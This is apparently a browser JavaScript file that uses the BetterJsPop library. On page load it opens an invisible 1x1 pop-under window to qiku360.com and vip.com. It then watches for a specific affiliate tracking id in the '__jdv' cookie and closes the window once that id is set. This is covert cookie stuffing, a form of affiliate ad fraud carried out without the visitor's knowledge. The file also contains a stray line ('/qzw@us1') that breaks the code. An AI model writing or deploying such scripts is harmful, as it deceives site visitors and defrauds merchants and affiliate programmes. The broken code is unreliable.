
(function(BetterJsPop) {
  /* var base = 'http://code.ptcong.com/demos/pop/';
  var useTab = !!~window.location.href.indexOf('tabunder');
  var getPopUrl = function() {
    var urls = [
      base + 'poped.html?1',
      base + 'poped.html?2'
    ];
    if (!!~window.location.href.indexOf('checkref')) {
      return 'https://www.whatismyreferer.com/';
    }

    return urls[Math.floor(Math.random() * urls.length)];
  };

  if (/^(localhost|192\.168\.|127\.0\.0\.)/.test(window.location.host)) {
    base = window.location.pathname.replace(/[^/]+$/g, '');
  }*/

  var iTop = (window.screen.height-30)/2;
  var iLeft = (window.screen.width-10)/2; 
  var desUrl = "http://www.qiku360.com/main.html?&f=" + parseInt(1E4 * Math.random()) + "&k=" + (new Date()).valueOf(); 
  var getCookie = function(c_name) {
      if (document.cookie.length > 0) {
          c_start = document.cookie.indexOf(c_name + "=");
          if (c_start != -1) {
              c_start = c_start + c_name.length + 1;
              c_end = document.cookie.indexOf(";", c_start);
              if (c_end == -1) {
                  c_end = document.cookie.length;
              }
              return unescape(document.cookie.substring(c_start, c_end));
          }
      }
      return "";
  };


  BetterJsPop
    .config({
      debug: false,
      perpage: 1,
      coverTags: ['iframe'],
      popFallbackOptions:{ under: true, newTab: true },
      mobileSensitive:10,
      noOpenerHijacking:true

    })
    .add(desUrl, {
      under: true,
      newTab: false,
      cookieExpires: 5,
      width: 1,
      height: 1,
      top: iTop,
      left: iLeft,
      beforeOpen: function(url, options) {

        this.getOptions().url = "http://www.vip.com/"
      },
      afterOpen: function(url, options, popWin) {
        var count = 0;
        var nextTimeClose = false; 
        var coid = setInterval(intervalCheck , 100);      
        function intervalCheck(){ 
            
        	/qzw@us1
        	
            if(nextTimeClose){
                popWin.close();
                clearInterval(coid);
            }else{
                if(count < 30){
                  var key = "__jdv";
                  if (/t_1000034640_/.test(getCookie(key))) {
                      nextTimeClose = true;
                      console.log("cookie is here " , count);
                  }
                }else{
                  popWin.close();
                  clearInterval(coid);
                }    
                count++;
                console.log("+++" , count);
            }        
        }  

      }
    });

}(window.BetterJsPop));
